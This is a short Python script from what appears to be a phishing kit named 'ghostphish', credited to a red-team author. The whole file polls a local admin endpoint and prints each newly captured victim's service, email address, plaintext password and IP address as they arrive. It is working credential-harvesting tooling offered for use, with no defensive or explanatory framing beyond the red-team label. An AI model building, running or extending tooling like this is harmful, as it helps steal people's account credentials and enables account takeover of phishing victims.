#!/usr/bin/env python3
"""
ghostphish — live capture watcher
Polls /admin/captures every 2s and prints new entries.
Developed by Yaman.RedTeam
"""
import sys
import time
import json
import urllib.request

URL = "http://localhost:8000/admin/captures"

# ANSI
C = "\033[0;36m"
W = "\033[1;37m"
Y = "\033[1;33m"
G = "\033[0;32m"
R = "\033[0;31m"
D = "\033[2m"
N = "\033[0m"


def main() -> int:
    seen = set()
    # On first tick, seed with existing IDs so we only show *new* ones
    first_tick = True

    try:
        while True:
            try:
                with urllib.request.urlopen(URL, timeout=3) as resp:
                    data = json.loads(resp.read())
            except Exception as e:
                print(f"  {R}[!] fetch error: {e}{N}", flush=True)
                time.sleep(3)
                continue

            captures = data.get("captures", [])
            for c in reversed(captures):
                cid = c["id"]
                if cid in seen:
                    continue
                seen.add(cid)
                if first_tick:
                    continue  # don't spam old rows on startup
                ts = c["timestamp"][11:19]
                svc = c["service"]
                email = c["email"]
                pw = c["password"]
                ip = c["ip_address"]
                print(
                    f"  {C}[{ts}]{N}  {W}{svc:9s}{N}  "
                    f"{Y}{email:30s}{N}  {G}{pw}{N}  {D}({ip}){N}",
                    flush=True,
                )
            first_tick = False
            time.sleep(2)
    except KeyboardInterrupt:
        print(f"\n  {D}Stopped watching. Container still running.{N}\n")
    return 0


if __name__ == "__main__":
    sys.exit(main())
